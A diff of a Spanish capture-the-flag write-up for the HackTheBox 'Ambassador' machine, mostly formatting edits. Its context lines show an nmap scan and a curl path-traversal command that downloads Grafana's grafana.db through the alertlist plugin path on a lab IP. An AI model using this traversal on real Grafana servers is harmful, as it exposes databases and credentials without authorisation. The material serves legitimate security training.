@@ -20,8 +20,6 @@ description : 📡Estoy ante una máquina Linux nivel Medium en la que aprovecha
 ![](/assets/images/HTB/Ambassador-HackTheBox/start.gif)
 
 ***
-
-
 **Un pequeño INDICE**
 
 1. [Reconocimiento](#reconocimiento).
@@ -32,13 +30,9 @@ description : 📡Estoy ante una máquina Linux nivel Medium en la que aprovecha
     * [Grafana Directory Traversal](#Grafana-Directory-Traversal).
 4. [Escalada de Privilegios](#privesc). 
     * [Consul Service](#Consul-service)
-    
-    
 ***
 
 # Reconocimiento [#](reconocimiento) {#reconocimiento}
-
-***
 
 ## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}
 
@@ -46,11 +40,9 @@ Como siempre comenzamos lanzando nmap para encontrar los puertos abiertos en la 
 
 ```bash
 # Comando para el reconocimiento de puertos
--------------------------------------------
 nmap -p- -Pn -n -sS --min-rate 5000 10.10.11.183 -oG escaneo1
 
 # Puertos Abiertos
-------------------
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
@@ -76,8 +68,6 @@ Realizo un escaneo más avanzado para obtener más información acerca de los se
 
 # Enumeración [#](enumeración) {#enumeración}
 
-***
-
 ## Enumeración Web [🔢](#enum-web) {#enum-web}
 
 Procedo a enumerar un poco el servidor web, en mi caso sentía la curiosidad de saber que había en el puerto 3000 asique fue lo primero que miré.
@@ -89,11 +79,10 @@ Al acceder encuentro lo siguiente:
 Estamos ante Grafana, que para el que no sepa lo que es:
 
 ```bash
-# Grafana
-Grafana es un software libre basado en licencia de Apache 2.0, ​ que permite la visualización y el formato de datos métricos. Permite crear cuadros de mando y gráficos a partir de múltiples fuentes, incluidas bases de datos de series de tiempo como Graphite, InfluxDB y OpenTSDB.
+Grafana es un software libre basado en licencia de Apache 2.0, permite la visualización y el formato de datos métricos. Permite crear cuadros de mando y gráficos a partir de múltiples fuentes, incluidas bases de datos de series de tiempo como Graphite, InfluxDB y OpenTSDB.
 ```
 
-> Más info aquí --> [https://pandorafms.com/blog/es/que-es-grafana/](https://pandorafms.com/blog/es/que-es-grafana/)
+> Más info aquí: [https://pandorafms.com/blog/es/que-es-grafana/](https://pandorafms.com/blog/es/que-es-grafana/)
 
 Busco alguna vulnerabilidad existente en el mismo a través de searchsploit.
 
@@ -102,8 +91,6 @@ Busco alguna vulnerabilidad existente en el mismo a través de searchsploit.
 Hay una vulnerabilidad que podemos aprovechar, existe un Directory Traversal and Arbitrary File Read.
 
 # Explotación [#](explotación) {#explotación}
-
-***
 
 ## Grafana Directory Traversal [🔢](#Grafana-Directory-Traversal) {#Grafana-Directory-Traversal}
 
@@ -251,7 +238,7 @@ LLegado a este punto intento descargar la base de datos a través de la vulnerab
 
 ```bash
 # Comando para descargar la base de datos
------------------------------------------
+
 curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
 ```
 
@@ -283,7 +270,6 @@ Me conecto y ya puedo leer la flag user.txt, pero antes ejecuto 2 comandos para 
 
 ```bash
 # Comandos sesión más funcional
--------------------------------
 EXPORT TERM=xterm
 EXPORT SHELL=bash
 ```
@@ -296,11 +282,7 @@ Y ya nos queda el último paso, escalar privilegios!!!
 
 # Escalada de Privilegios [#](privesc) {#privesc}
 
-***
-
 ## Consul Service [🔢](#Consul Service) {#Consul-service}
-
-
 
 Enumerando un poco el sistema encuentro en la ruta /opt varios directorios.
 
